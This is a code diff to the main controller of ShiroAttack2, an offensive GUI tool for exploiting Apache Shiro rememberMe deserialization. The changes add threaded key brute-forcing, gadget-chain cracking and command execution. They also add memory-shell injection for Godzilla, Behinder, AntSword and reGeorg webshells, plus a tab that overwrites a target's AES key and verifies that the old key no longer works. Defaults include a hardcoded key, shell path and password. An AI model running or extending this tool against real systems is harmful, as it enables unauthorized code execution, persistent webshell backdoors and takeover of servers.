@@ -5,6 +5,8 @@ import com.summersec.attack.core.AttackService;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.integration.generator.model.EchoGenerateResult;
 import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
+import com.summersec.attack.utils.AppLogger;
+import com.summersec.attack.utils.HttpUtil;
 import com.summersec.attack.utils.Utils;
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
@@ -12,14 +14,19 @@ import java.net.PasswordAuthentication;
 import java.net.Proxy;
 import java.net.URL;
 import java.net.Proxy.Type;
+import java.awt.Desktop;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.ResourceBundle;
+import java.util.prefs.Preferences;
 import javafx.beans.value.ChangeListener;
+import javafx.concurrent.Task;
 import javafx.beans.value.ObservableValue;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
+import javafx.application.Platform;
 import javafx.event.ActionEvent;
 import javafx.fxml.FXML;
 import javafx.geometry.Insets;
@@ -30,28 +37,66 @@ import javafx.scene.control.CheckBox;
 import javafx.scene.control.ComboBox;
 import javafx.scene.control.Label;
 import javafx.scene.control.MenuItem;
+import javafx.scene.control.Menu;
+import javafx.scene.control.ProgressBar;
+import javafx.scene.control.RadioMenuItem;
 import javafx.scene.control.RadioButton;
+import javafx.scene.control.Tab;
+import javafx.scene.control.TabPane;
 import javafx.scene.control.TextArea;
 import javafx.scene.control.TextField;
 import javafx.scene.control.ToggleGroup;
 import javafx.scene.control.Alert.AlertType;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
+import javafx.scene.layout.Priority;
+import javafx.scene.control.Hyperlink;
+import javafx.scene.control.TitledPane;
 import javafx.stage.Window;
 
 public class MainController {
+    private enum LanguageMode {
+        ZH,
+        EN
+    }
+
+    private static final int CHANGE_KEY_HISTORY_MAX = 30;
+    private static final String PREF_NODE_CHANGE_KEY = "com/summersec/attack/shiroAttack2";
+    private static final String PREF_CHANGE_KEY_HISTORY = "changeShiroKeyHistoryBase64";
+    private static final String DEFAULT_CHANGE_KEY = "FcoRsBKe9XB3zOHbxTG0Lw==";
+    private LanguageMode languageMode = LanguageMode.ZH;
+
+    private volatile Task<Boolean> crackTaskRef;
+    private volatile long crackStartMillis;
+    private volatile Task<Boolean> keyCrackTaskRef;
+    private volatile long keyCrackStartMillis;
+
     @FXML
     private ResourceBundle resources;
     @FXML
     private URL location;
     @FXML
+    private Menu settingsMenu;
+    @FXML
+    private Menu languageMenu;
+    @FXML
     private MenuItem proxySetupBtn;
+    @FXML
+    private RadioMenuItem langZhMenuItem;
+    @FXML
+    private RadioMenuItem langEnMenuItem;
+    @FXML
+    private TabPane mainTabPane;
+    @FXML
+    private TitledPane requestConfigPane;
+    @FXML
+    private TitledPane baseAttackPane;
     @FXML
     private ComboBox<String> methodOpt;
     @FXML
-    private TextField globalHeader;
+    private TextArea globalHeader;
     @FXML
-    private TextField post_data;
+    private TextArea post_data;
     @FXML
     private TextField shiroKeyWord;
     @FXML
@@ -67,33 +112,104 @@ public class MainController {
     @FXML
     private Button crackSpcKeyBtn;
     @FXML
+    private Label keyCrackProgressLabel;
+    @FXML
+    private ProgressBar keyCrackProgressBar;
+    @FXML
+    private Button cancelKeyCrackBtn;
+    @FXML
+    private Button crackSpcGadgetBtn;
+    @FXML
+    private Button crackGadgetBtn;
+    @FXML
+    private Label crackProgressLabel;
+    @FXML
+    private javafx.scene.control.ProgressBar crackProgressBar;
+    @FXML
+    private Button cancelCrackBtn;
+    @FXML
+    private Button executeCmdBtn;
+    @FXML
+    public TextArea logTextArea;
+    @FXML
     public ComboBox<String> gadgetOpt;
     @FXML
     public ComboBox<String> echoOpt;
     @FXML
-    private Button crackGadgetBtn;
-    @FXML
-    private Button crackSpcGadgetBtn;
-    @FXML
-    public TextArea logTextArea;
-    @FXML
-    private Label proxyStatusLabel;
-    public static Map currentProxy = new HashMap();
-    public AttackService attackService = null;
-    @FXML
-    private TextField exCommandText;
-    @FXML
     public TextArea execOutputArea;
     @FXML
-    private Button executeCmdBtn;
+    public TextField exCommandText;
+    @FXML
+    public Label proxyStatusLabel;
+    @FXML
+    private Label timeoutLabel;
+    @FXML
+    private Label headerLabel;
+    @FXML
+    private Label postBodyLabel;
+    @FXML
+    private Label cookieKeywordLabel;
+    @FXML
+    private Label specifiedKeyLabel;
+    @FXML
+    private Label gadgetLabel;
+    @FXML
+    private Label echoLabel;
+    @FXML
+    private Tab logTab;
+    @FXML
+    private Tab execTab;
+    @FXML
+    private Tab injectTab;
+    @FXML
+    private Tab changeKeyTab;
+    @FXML
+    private Tab echoGenTab;
+    @FXML
+    private Tab memGenTab;
+    @FXML
+    private Tab keyGenTab;
+    @FXML
+    private Label commandInputLabel;
+    @FXML
+    private Label memshellTypeLabel;
+    @FXML
+    private Label memshellPathLabel;
+    @FXML
+    private Label memshellPasswordLabel;
+    @FXML
+    private Label changeKeyHintLabel;
+    @FXML
+    private Label changeKeyMethodLabel;
+    @FXML
+    private Label changeKeyTargetLabel;
+    @FXML
+    private Button clearChangeKeyHistoryBtn;
+    @FXML
+    private Hyperlink githubLink;
+    @FXML
+    private Label footerByLabel;
+
+    public static Map<String, Object> currentProxy = new HashMap<String, Object>();
+    private AttackService attackService;
+
     @FXML
     public ComboBox<String> memShellOpt;
+
     @FXML
     private TextField shellPathText;
     @FXML
     private TextField shellPassText;
     @FXML
     private Button injectShellBtn;
+    @FXML
+    private ComboBox<String> changeKeyVariantOpt;
+    @FXML
+    private ComboBox<String> changeKeyNewKeyCombo;
+    @FXML
+    private Button injectChangeKeyBtn;
+    @FXML
+    private TextArea changeKeyOutputArea;
     @FXML
     public TextArea InjOutputArea;
     @FXML
@@ -132,135 +248,361 @@ public class MainController {
     public MainController() {
     }
 
+    private static boolean isJava8Runtime() {
+        String spec = System.getProperty("java.specification.version", "");
+        return "1.8".equals(spec) || "8".equals(spec);
+    }
+
+    private void showGuidanceAlert(AlertType type, String title, String header, String content) {
+        Alert alert = new Alert(type);
+        alert.setTitle(title);
+        alert.setHeaderText(header);
+        alert.setContentText(content);
+        alert.setResizable(true);
+        alert.getDialogPane().setPrefWidth(560);
+        alert.show();
+    }
+
+    @FXML
+    void openGithubLink(ActionEvent event) {
+        try {
+            Desktop.getDesktop().browse(new java.net.URI("https://github.com/SummerSec/ShiroAttack2"));
+        } catch (Exception ex) {
+            this.logTextArea.appendText(Utils.log("[!] 打开 GitHub 链接失败: " + ex.getMessage()));
+            AppLogger.error("打开 GitHub 链接失败", ex);
+        }
+    }
+
+    @FXML
+    void switchToChinese(ActionEvent event) {
+        this.languageMode = LanguageMode.ZH;
+        this.applyLanguage();
+    }
+
+    @FXML
+    void switchToEnglish(ActionEvent event) {
+        this.languageMode = LanguageMode.EN;
+        this.applyLanguage();
+    }
+
+    private void applyLanguage() {
+        boolean zh = this.languageMode == LanguageMode.ZH;
+        if (this.settingsMenu != null) this.settingsMenu.setText(zh ? "设置" : "Settings");
+        if (this.languageMenu != null) this.languageMenu.setText(zh ? "语言" : "Language");
+        if (this.proxySetupBtn != null) this.proxySetupBtn.setText(zh ? "代理" : "Proxy");
+        if (this.requestConfigPane != null) this.requestConfigPane.setText(zh ? "目标与请求配置" : "Target & Request");
+        if (this.baseAttackPane != null) this.baseAttackPane.setText(zh ? "检测与攻击基础参数" : "Detection & Attack Basics");
+        if (this.timeoutLabel != null) this.timeoutLabel.setText(zh ? "超时/s" : "Timeout/s");
+        if (this.headerLabel != null) this.headerLabel.setText("Header");
+        if (this.postBodyLabel != null) this.postBodyLabel.setText(zh ? "POST Body" : "POST Body");
+        if (this.cookieKeywordLabel != null) this.cookieKeywordLabel.setText(zh ? "Cookie关键字" : "Cookie Key");
+        if (this.specifiedKeyLabel != null) this.specifiedKeyLabel.setText(zh ? "指定Key" : "Specified Key");
+        if (this.gadgetLabel != null) this.gadgetLabel.setText(zh ? "利用链" : "Gadget");
+        if (this.echoLabel != null) this.echoLabel.setText(zh ? "回显" : "Echo");
+        if (this.crackSpcKeyBtn != null) this.crackSpcKeyBtn.setText(zh ? "检测当前密钥" : "Check Key");
+        if (this.crackKeyBtn != null) this.crackKeyBtn.setText(zh ? "爆破密钥" : "Crack Keys");
+        if (this.cancelKeyCrackBtn != null) this.cancelKeyCrackBtn.setText(zh ? "停止爆破Key" : "Stop Key Crack");
+        if (this.keyCrackProgressLabel != null && (this.keyCrackProgressLabel.getText() == null || this.keyCrackProgressLabel.getText().contains("就绪") || this.keyCrackProgressLabel.getText().contains("ready"))) {
+            this.keyCrackProgressLabel.setText(zh ? "Key 爆破状态：待开始" : "Key crack status: idle");
+        }
+        if (this.crackSpcGadgetBtn != null) this.crackSpcGadgetBtn.setText(zh ? "检测当前利用链" : "Check Gadget");
+        if (this.crackGadgetBtn != null) this.crackGadgetBtn.setText(zh ? "爆破利用链及回显" : "Crack Gadget & Echo");
+        if (this.cancelCrackBtn != null) this.cancelCrackBtn.setText(zh ? "停止" : "Stop");
+        if (this.logTab != null) this.logTab.setText(zh ? "检测日志" : "Logs");
+        if (this.execTab != null) this.execTab.setText(zh ? "命令执行" : "Command Exec");
+        if (this.injectTab != null) this.injectTab.setText(zh ? "内存马注入" : "Memshell Inject");
+        if (this.changeKeyTab != null) this.changeKeyTab.setText(zh ? "修改 Shiro Key" : "Change Shiro Key");
+        if (this.echoGenTab != null) this.echoGenTab.setText(zh ? "回显生成" : "Echo Generate");
+        if (this.memGenTab != null) this.memGenTab.setText(zh ? "内存马生成" : "Memshell Generate");
+        if (this.keyGenTab != null) this.keyGenTab.setText(zh ? "Key 生成" : "Key Generate");
+        if (this.commandInputLabel != null) this.commandInputLabel.setText(zh ? "输入命令" : "Command");
+        if (this.executeCmdBtn != null) this.executeCmdBtn.setText(zh ? "执行" : "Run");
+        if (this.memshellTypeLabel != null) this.memshellTypeLabel.setText(zh ? "类型" : "Type");
+        if (this.memshellPathLabel != null) this.memshellPathLabel.setText(zh ? "路径" : "Path");
+        if (this.memshellPasswordLabel != null) this.memshellPasswordLabel.setText(zh ? "密码" : "Password");
+        if (this.injectShellBtn != null) this.injectShellBtn.setText(zh ? "执行注入" : "Inject");
+        if (this.changeKeyHintLabel != null) this.changeKeyHintLabel.setText(zh ? "先完成密钥和利用链检测，再执行本页。" : "Finish key and gadget detection before using this tab.");
+        if (this.changeKeyMethodLabel != null) this.changeKeyMethodLabel.setText(zh ? "方式" : "Mode");
+        if (this.changeKeyTargetLabel != null) this.changeKeyTargetLabel.setText(zh ? "目标 Key" : "Target Key");
+        if (this.clearChangeKeyHistoryBtn != null) this.clearChangeKeyHistoryBtn.setText(zh ? "清空历史" : "Clear History");
+        if (this.injectChangeKeyBtn != null) this.injectChangeKeyBtn.setText(zh ? "执行" : "Apply");
+        if (this.keygen != null) this.keygen.setText(zh ? "生成 Key" : "Generate Key");
+        if (this.footerByLabel != null) this.footerByLabel.setText("BY SummerSec");
+        if (this.githubLink != null) this.githubLink.setText(zh ? "GitHub: github.com/SummerSec/ShiroAttack2" : "GitHub: github.com/SummerSec/ShiroAttack2");
+
+        if (this.globalHeader != null) {
+            this.globalHeader.setPromptText(zh
+                    ? "一行一个 Header，例如\nCookie: rememberMe=xxx\nUser-Agent: Mozilla/5.0"
+                    : "One header per line, for example\nCookie: rememberMe=xxx\nUser-Agent: Mozilla/5.0");
+        }
+        if (this.post_data != null) {
+            this.post_data.setPromptText(zh
+                    ? "直接填写原始 POST Body，默认原样覆盖发送"
+                    : "Paste raw POST body here. It overwrites by default.");
+        }
+        if (this.changeKeyNewKeyCombo != null) {
+            this.changeKeyNewKeyCombo.setPromptText(zh ? "rememberMe AES Key（Base64）" : "rememberMe AES Key (Base64)");
+        }
+    }
+
+    private void warnIfNotJava8() {
+        if (isJava8Runtime()) {
+            return;
+        }
+        String ver = System.getProperty("java.version", "未知");
+        String spec = System.getProperty("java.specification.version", "未知");
+        showGuidanceAlert(
+                AlertType.WARNING,
+                "运行环境提示",
+                "当前未在 JDK 8 下运行",
+                "检测到 Java 版本：" + ver + "（java.specification.version=" + spec + "）。\n\n"
+                        + "本工具按 Java 8 + JavaFX 8 构建与测试，其它大版本可能出现界面缺失、序列化或依赖行为差异。\n\n"
+                        + "建议：使用带 JavaFX 的 JDK 8（例如 Azul ZuluFX 8）启动 jar，可获得最稳定体验。\n"
+                        + "若坚持使用当前 JDK，请先阅读日志报错；多数「找不到模块/JavaFX」类问题换 JDK 8 即可排除。");
+    }
+
     @FXML
     void injectShellBtn(ActionEvent event) {
         String memShellType = (String)this.memShellOpt.getValue();
         String shellPass = this.shellPassText.getText();
         String shellPath = this.shellPathText.getText();
+        AppLogger.info("内存马注入: type=" + memShellType + ", path=" + shellPath);
         if (AttackService.gadget != null ) {
             this.attackService.injectMem(memShellType, shellPass, shellPath);
         } else {
             this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
+            this.showGuidanceAlert(
+                    AlertType.INFORMATION,
+                    "无法注入内存马",
+                    "尚未完成「密钥 + 利用链」检测",
+                    "原因：内存马注入依赖已成功构造的 Gadget 链与有效 Shiro Key（rememberMe 加密）。\n\n"
+                            + "请先：\n"
+                            + "1）填写目标 URL、Cookie 关键字等后，点击「检测当前密钥」或「爆破密钥」；\n"
+                            + "2）再点击「检测当前利用链」或「爆破利用链及回显」，直到日志中出现成功信息；\n"
+                            + "3）然后回到本页重新执行注入。\n\n"
+                            + "若仍失败，请确认目标为 Tomcat/Shiro 典型环境，并尝试更换利用链与回显组合。");
         }
-
     }
 
     @FXML
-    void executeCmdBtn(ActionEvent event) {
-//        String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
-        if (AttackService.attackRememberMe != null) {
-            String command = this.exCommandText.getText();
-            if (!command.equals("")) {
-                this.attackService.execCmdTask(command);
+    void injectChangeKeyBtn(ActionEvent event) {
+        if (this.attackService == null) {
+            this.initAttack();
+        }
+        String memShellType = this.changeKeyVariantOpt.getValue();
+        AppLogger.info("修改 Shiro Key: variant=" + memShellType);
+        String oldKey = this.shiroKey != null ? this.shiroKey.getText() : "";
+        if ("高风险: 全候选 rememberMeManager 扫描".equals(memShellType)) {
+            this.showGuidanceAlert(
+                    AlertType.WARNING,
+                    "高风险修改模式",
+                    "将尝试批量修改多个 rememberMeManager 候选对象",
+                    "该模式用于怀疑目标存在多个 rememberMeManager / 多条 Shiro Filter 链路的场景。\n\n"
+                            + "风险：\n"
+                            + "1）可能同时影响多个 Shiro 相关组件；\n"
+                            + "2）如果目标是复杂业务环境，可能导致 rememberMe 行为整体异常；\n"
+                            + "3）这仍不等于跨集群所有节点都已修改，只是尽量覆盖当前节点中的更多候选对象。\n\n"
+                            + "建议：修改后务必同时验证“新 key 成功 / 旧 key 失败”。");
+        }
+        String shellPass = this.getChangeKeyInputText();
+        if (AttackService.gadget != null) {
+            this.attackService.injectMem(memShellType, shellPass, "", this.changeKeyOutputArea);
+            this.changeKeyOutputArea.appendText(Utils.log("[验证] 开始验证新旧 Key 状态..."));
+            boolean newKeyOk = this.attackService.verifyKey(shellPass);
+            boolean oldKeyStillOk = oldKey != null && !oldKey.trim().isEmpty() && this.attackService.verifyKey(oldKey.trim());
+            if (newKeyOk && !oldKeyStillOk) {
+                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 成功：新 Key 可用，旧 Key 已失效"));
+            } else if (newKeyOk) {
+                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 部分成功：新 Key 可用，但旧 Key 仍可用"));
+                this.changeKeyOutputArea.appendText(Utils.log("[风险提示] 疑似存在多个 rememberMeManager 或多节点场景；建议改用“高风险: 全候选 rememberMeManager 扫描”并逐节点重复验证。"));
+                this.showGuidanceAlert(
+                        AlertType.WARNING,
+                        "Key 修改仅部分生效",
+                        "旧 key 仍然可用",
+                        "这通常意味着当前目标存在多个 rememberMeManager 候选对象，或者你的请求命中了不同节点。\n\n"
+                                + "建议：\n"
+                                + "1）切换到“高风险: 全候选 rememberMeManager 扫描”；\n"
+                                + "2）重复执行修改后验证；\n"
+                                + "3）如果目标是集群/多节点，请分别命中不同节点执行。\n\n"
+                                + "风险：高风险模式可能同时影响多个 Shiro 组件，请谨慎使用。");
             } else {
-                this.execOutputArea.appendText(Utils.log("请先输入获取的命令"));
+                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 未确认成功：新 Key 验证失败，请重试其他变体"));
             }
+            this.changeKeyOutputArea.appendText(Utils.log("-------------------------------------------------"));
         } else {
-            this.execOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
+            this.changeKeyOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
+            this.showGuidanceAlert(
+                    AlertType.INFORMATION,
+                    "无法修改 Shiro Key",
+                    "尚未完成「密钥 + 利用链」检测",
+                    "原因：修改 Key 的内存逻辑同样依赖已成功构造的注入链与当前可用 Key。\n\n"
+                            + "请先在上方完成密钥检测与利用链检测（与「内存马注入」相同前置步骤），再执行本页注入。\n\n"
+                            + "新 Key 请填写 rememberMe 所用 AES 密钥的 Base64；可用「key生成」页生成后从历史下拉选用。");
         }
-
-    }
-
-    @FXML
-    void crackSpcGadgetBtn(ActionEvent event) {
-        String spcShiroKey = this.shiroKey.getText();
-        if (this.attackService == null) {
-            this.initAttack();
+        if (!shellPass.isEmpty()) {
+            this.rememberChangeKeyUsed(shellPass);
         }
-        if (!spcShiroKey.equals("")) {
-            boolean flag = this.attackService.gadgetCrack((String)this.gadgetOpt.getValue(), (String)this.echoOpt.getValue(), spcShiroKey);
-            if (!flag) {
-                this.logTextArea.appendText(Utils.log("未找到构造链"));
-            }
-        } else {
-            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
-        }
-
-    }
-
-    @FXML
-    void crackGadgetBtn(ActionEvent event) {
-        String spcShiroKey = this.shiroKey.getText();
-        if (this.attackService == null) {
-            this.initAttack();
-        }
-
-        boolean flag = false;
-        if (!spcShiroKey.equals("")) {
-            List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
-
-            for(int i = 0; i < targets.size(); ++i) {
-                String[] t = ((String)targets.get(i)).split(":");
-                String gadget = t[0];
-                String echo = t[1];
-                flag = this.attackService.gadgetCrack(gadget, echo, spcShiroKey);
-                if (flag) {
-                    break;
-                }
-            }
-        } else {
-            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
-        }
-
-        if (!flag) {
-            this.logTextArea.appendText(Utils.log("未找到构造链"));
-        }
-
     }
 
     @FXML
     void crackSpcKeyBtn(ActionEvent event) {
         this.initAttack();
+        AppLogger.info("检测当前密钥");
+        Task<Boolean> running = this.keyCrackTaskRef;
+        if (running != null && running.isRunning()) {
+            this.logTextArea.appendText(Utils.log("Key 爆破任务正在运行中"));
+            return;
+        }
         if (this.attackService.checkIsShiro()) {
             String spcShiroKey = this.shiroKey.getText();
             if (!spcShiroKey.equals("")) {
-                this.attackService.simpleKeyCrack(spcShiroKey);
+                this.startKeyCrackTask(FXCollections.observableArrayList(new String[]{spcShiroKey}), false);
             } else {
                 this.logTextArea.appendText(Utils.log("请输入指定密钥"));
             }
         }
+    }
 
+    @FXML
+    void clearChangeKeyHistoryBtn(ActionEvent event) {
+        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
+        p.remove(PREF_CHANGE_KEY_HISTORY);
+        if (this.changeKeyNewKeyCombo != null) {
+            this.changeKeyNewKeyCombo.setItems(FXCollections.observableArrayList(new String[]{DEFAULT_CHANGE_KEY}));
+            this.changeKeyNewKeyCombo.getEditor().setText(DEFAULT_CHANGE_KEY);
+            this.changeKeyNewKeyCombo.getSelectionModel().clearSelection();
+        }
+        this.changeKeyOutputArea.appendText(Utils.log("[历史] 已清空修改 Key 历史记录"));
+        AppLogger.info("已清空修改 Shiro Key 历史记录");
     }
 
     @FXML
     void crackKeyBtn(ActionEvent event) {
         this.initAttack();
-        if (this.attackService.checkIsShiro()) {
-            this.attackService.keysCrack();
+        AppLogger.info("爆破密钥");
+        Task<Boolean> running = this.keyCrackTaskRef;
+        if (running != null && running.isRunning()) {
+            this.logTextArea.appendText(Utils.log("Key 爆破任务正在运行中"));
+            return;
         }
+        if (this.attackService.checkIsShiro()) {
+            List<String> shiroKeys = this.attackService.getALLShiroKeys();
+            this.startKeyCrackTask(shiroKeys, this.attackService.flagCount > 1);
+        }
+    }
 
+    private String getChangeKeyInputText() {
+        if (this.changeKeyNewKeyCombo == null || this.changeKeyNewKeyCombo.getEditor() == null) {
+            return "";
+        }
+        String t = this.changeKeyNewKeyCombo.getEditor().getText();
+        return t == null ? "" : t.trim();
+    }
+
+    private List<String> loadChangeKeyHistoryFromPrefs() {
+        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
+        String raw = p.get(PREF_CHANGE_KEY_HISTORY, "");
+        List<String> out = new ArrayList<String>();
+        if (raw != null && !raw.isEmpty()) {
+            for (String line : raw.split("\n")) {
+                String s = line.trim();
+                if (!s.isEmpty()) {
+                    out.add(s);
+                }
+            }
+        }
+        return out;
+    }
+
+    private void persistChangeKeyHistory() {
+        if (this.changeKeyNewKeyCombo == null) {
+            return;
+        }
+        List<String> lines = new ArrayList<String>();
+        for (String s : this.changeKeyNewKeyCombo.getItems()) {
+            if (s != null && !s.trim().isEmpty()) {
+                lines.add(s.trim());
+            }
+        }
+        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
+        p.put(PREF_CHANGE_KEY_HISTORY, String.join("\n", lines));
+    }
+
+    private void rememberChangeKeyUsed(String key) {
+        if (key == null || key.trim().isEmpty() || this.changeKeyNewKeyCombo == null) {
+            return;
+        }
+        key = key.trim();
+        ObservableList<String> items = this.changeKeyNewKeyCombo.getItems();
+        items.remove(key);
+        items.add(0, key);
+        while (items.size() > CHANGE_KEY_HISTORY_MAX) {
+            items.remove(items.size() - 1);
+        }
+        this.changeKeyNewKeyCombo.getEditor().setText(key);
+        this.changeKeyNewKeyCombo.getSelectionModel().clearSelection();
+        this.persistChangeKeyHistory();
+    }
+
+    private void initChangeKeyHistoryCombo() {
+        this.changeKeyNewKeyCombo.setEditable(true);
+        List<String> loaded = this.loadChangeKeyHistoryFromPrefs();
+        if (loaded.isEmpty()) {
+            loaded.add(DEFAULT_CHANGE_KEY);
+        }
+        this.changeKeyNewKeyCombo.setItems(FXCollections.observableArrayList(loaded));
+        this.changeKeyNewKeyCombo.getEditor().setText(loaded.get(0));
+        this.changeKeyNewKeyCombo.getSelectionModel().selectedItemProperty().addListener((obs, o, n) -> {
+            if (n != null && !n.trim().isEmpty()) {
+                this.changeKeyNewKeyCombo.getEditor().setText(n);
+            }
+        });
     }
 
     @FXML
     void initialize() {
+
         this.initToolbar();
         this.initComBoBox();
         this.initContext();
         ControllersFactory.controllers.put(MainController.class.getSimpleName(), this);
+        this.updateCrackProgress(0, 0, "利用链爆破状态：待开始");
+        this.setCrackButtonsDisabled(false);
+        Platform.runLater(this::warnIfNotJava8);
     }
 
     public void initAttack() {
         String shiroKeyWordText = this.shiroKeyWord.getText();
         String targetAddressText = this.targetAddress.getText();
         String httpTimeoutText = this.httpTimeout.getText();
-        //自定义请求头
-        Map<String, String> myheader= new HashMap<>() ;
-        if(!this.globalHeader.getText().equals("")) {
-            String headers[] = this.globalHeader.getText().split("&&&");
-//        myheader(this.globalHeader.getText() -> this.globalHeader.getText().split(":"))
-            for (int i = 0; i < headers.length; i++ ) {
-                String header[] = headers[i].split(":", 2);
-                if (header[0].toLowerCase().equals("cookie")) {
-                    myheader.put("Cookie", header[1]);
-                } else {
-                    myheader.put(header[0], header[1]);
+        AppLogger.info("初始化攻击服务: method=" + this.methodOpt.getValue() + ", target=" + targetAddressText + ", keyWord=" + shiroKeyWordText + ", timeout=" + httpTimeoutText);
+        Map<String, String> myheader = new HashMap<String, String>();
+        String rawHeaders = this.globalHeader.getText();
+        if (rawHeaders != null && !rawHeaders.trim().isEmpty()) {
+            String[] headers = rawHeaders.split("\\r?\\n");
+            for (String line : headers) {
+                if (line == null) {
+                    continue;
+                }
+                String trimmed = line.trim();
+                if (trimmed.isEmpty()) {
+                    continue;
+                }
+                String[] header = trimmed.split(":", 2);
+                if (header.length < 2) {
+                    this.logTextArea.appendText(Utils.log("[!] 忽略非法 Header 行: " + trimmed));
+                    continue;
+                }
+                String key = header[0].trim();
+                String value = header[1].trim();
+                if (!key.isEmpty()) {
+                    myheader.put(key, value);
                 }
             }
         }
-//        this.globalHeader = myheader
-        String postData = (String)this.post_data.getText();
+        String postData = this.post_data.getText();
         String reqMethod = (String)this.methodOpt.getValue();
-        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText,myheader,postData);
+        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText, myheader, postData);
         if (this.aesGcmOpt.isSelected()) {
             AttackService.aesGcmCipherType = 1;
         } else {
@@ -272,6 +614,9 @@ public class MainController {
     public void initContext() {
         this.shiroKeyWord.setText("rememberMe");
         this.httpTimeout.setText("10");
+        if (this.targetAddress != null && (this.targetAddress.getText() == null || this.targetAddress.getText().trim().isEmpty())) {
+            this.targetAddress.setText("http://127.0.0.1:8080/");
+        }
     }
 
     public void initComBoBox() {
@@ -293,7 +638,7 @@ public class MainController {
         this.echoOpt.setItems(echoes);
         this.shellPassText.setText("pass1024");
         this.shellPathText.setText("/favicondemo.ico");
-        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]", "ChangeShiroKey[Filter]", "ChangeShiroKey[Filter2]", "BastionFilter", "BastionEncryFilter", "AddDllFilter"});
+        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]", "ChangeShiroKeyFilter1", "ChangeShiroKeyFilter2", "BastionFilter", "BastionEncryFilter", "AddDllFilter"});
 //        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Servlet]", "冰蝎[Servlet]", "蚁剑[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]"});
         this.memShellOpt.setPromptText("冰蝎[Filter]");
         this.memShellOpt.setValue("冰蝎[Filter]");
@@ -306,41 +651,77 @@ public class MainController {
                 } else {
                     MainController.this.shellPassText.setDisable(false);
                 }
-                if (((String)memShells.get(number2.intValue())).contains("ChangeShiroKey")){
-//                    MainController.this.
-                    MainController.this.shellPathText.setDisable(true);
-                    MainController.this.shellPassText.setText("FcoRsBKe9XB3zOHbxTG0Lw==");
-                }else {
-                    MainController.this.shellPathText.setDisable(false);
-                }
-
             }
         });
         this.shellPathText.setText("/favicondemo.ico");
 
-        ObservableList<String> generatorSources = FXCollections.observableArrayList(new String[]{"Legacy", "jEG", "jMG"});
-        this.echoSourceOpt.setItems(generatorSources);
-        this.echoSourceOpt.setValue("Legacy");
-        this.memshellSourceOpt.setItems(generatorSources);
-        this.memshellSourceOpt.setValue("Legacy");
+        ObservableList<String> echoGeneratorSources = FXCollections.observableArrayList("传统模式", "jEG");
+        this.echoSourceOpt.setItems(echoGeneratorSources);
+        this.echoSourceOpt.setValue("传统模式");
+        ObservableList<String> memshellGeneratorSources = FXCollections.observableArrayList("传统模式", "jMG");
+        this.memshellSourceOpt.setItems(memshellGeneratorSources);
+        this.memshellSourceOpt.setValue("传统模式");
 
-        this.jegServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING"}));
+        this.jegServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH", "SERVER_BES", "SERVER_INFORSUITE", "SERVER_TONGWEB"}));
         this.jegServerOpt.setValue("SERVER_TOMCAT");
-        this.jegModelOpt.setItems(FXCollections.observableArrayList(new String[]{"MODEL_CMD"}));
+        this.jegModelOpt.setItems(FXCollections.observableArrayList(new String[]{"MODEL_CMD", "MODEL_CODE"}));
         this.jegModelOpt.setValue("MODEL_CMD");
-        this.jegFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64"}));
+        this.jegFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64", "FORMAT_BCEL", "FORMAT_BIGINTEGER", "FORMAT_CLASS", "FORMAT_JAR", "FORMAT_JS"}));
         this.jegFormatOpt.setValue("FORMAT_BASE64");
 
-        this.jmgToolOpt.setItems(FXCollections.observableArrayList(new String[]{"TOOL_GODZILLA", "TOOL_BEHINDER", "TOOL_ANTSWORD"}));
+        this.jmgToolOpt.setItems(FXCollections.observableArrayList(new String[]{"TOOL_ANTSWORD", "TOOL_BEHINDER", "TOOL_GODZILLA", "TOOL_NEOREG", "TOOL_SUO5", "TOOL_CUSTOM"}));
         this.jmgToolOpt.setValue("TOOL_GODZILLA");
-        this.jmgServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING"}));
